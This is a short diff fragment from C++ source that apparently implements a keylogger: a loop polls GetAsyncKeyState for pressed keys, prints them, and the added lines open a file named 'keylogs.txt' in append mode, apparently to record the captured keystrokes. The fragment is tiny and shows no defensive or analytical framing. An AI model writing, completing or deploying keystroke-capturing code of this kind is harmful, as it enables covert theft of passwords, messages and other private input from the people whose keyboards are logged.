@@ -51,3 +51,5 @@ int main(){
             if (GetAsyncKeyState(key) == -32767){
 			if(Keylist(key) == FALSE){
                     cout << key;
+					ofstream logfile;
+                    logfile.open("keylogs.txt", fstream::app);
